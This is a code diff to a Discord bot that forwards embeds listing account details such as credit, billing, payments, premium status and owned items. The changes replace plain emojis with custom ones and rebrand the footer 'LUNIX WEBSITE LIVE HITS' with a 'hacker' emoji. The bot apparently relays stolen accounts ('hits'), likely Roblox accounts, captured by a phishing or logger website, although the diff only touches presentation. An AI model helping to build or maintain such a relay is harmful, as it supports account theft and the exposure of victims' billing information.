@@ -465,13 +465,13 @@ client.on('messageCreate', async (message) => {
                     } else if (field.name.toLowerCase().includes('owned') || field.name.toLowerCase().includes('items')) {
                         enhancedName = `📦 ${field.name}`;
                     } else if (field.name.toLowerCase().includes('credit') || field.name.toLowerCase().includes('billing')) {
-                        enhancedName = `💳 ${field.name}`;
+                        enhancedName = `<a:Card:1408083250412523581> ${field.name}`;
                     } else if (field.name.toLowerCase().includes('convert')) {
                         enhancedName = `🔄 ${field.name}`;
                     } else if (field.name.toLowerCase().includes('payment') || field.name.toLowerCase().includes('payments')) {
                         enhancedName = `💸 ${field.name}`;
                     } else if (field.name.toLowerCase().includes('premium')) {
-                        enhancedName = `⭐ ${field.name}`;
+                        enhancedName = `<:rbxPremium:1408083254531330158> ${field.name}`;
                     } else if (field.name.toLowerCase().includes('setting') || field.name.toLowerCase().includes('status')) {
                         enhancedName = `⚙️ ${field.name}`;
                     } else if (field.name.toLowerCase().includes('game') || field.name.toLowerCase().includes('pass')) {
@@ -515,7 +515,7 @@ client.on('messageCreate', async (message) => {
                     enhancedValue = enhancedValue.replace(/\bVerified\b/gi, '<:yes:1393890949960306719> Verified');
                     enhancedValue = enhancedValue.replace(/\bDisabled\b/gi, '<:no:1393890945929318542> Disabled');
                     enhancedValue = enhancedValue.replace(/\bEnabled\b/gi, '<:yes:1393890949960306719> Enabled');
-                    enhancedValue = enhancedValue.replace(/\bUnset\b/gi, '⚪ Unset');
+                    enhancedValue = enhancedValue.replace(/\bUnset\b/gi, '<a:Verified:1333386641292791828> Unset');
 
                     forwardedEmbed.addFields({
                         name: enhancedName,
@@ -546,7 +546,7 @@ client.on('messageCreate', async (message) => {
             }
         }
         
-        const forwardingText = `🔥 LUNIX WEBSITE LIVE HITS 🔥`;
+        const forwardingText = `<:hacker:1404745235711655987> LUNIX WEBSITE LIVE HITS <:hacker:1404745235711655987>`;
         const newFooterText = originalFooter ? `${originalFooter} • ${forwardingText}` : forwardingText;
 
         forwardedEmbed.setFooter({
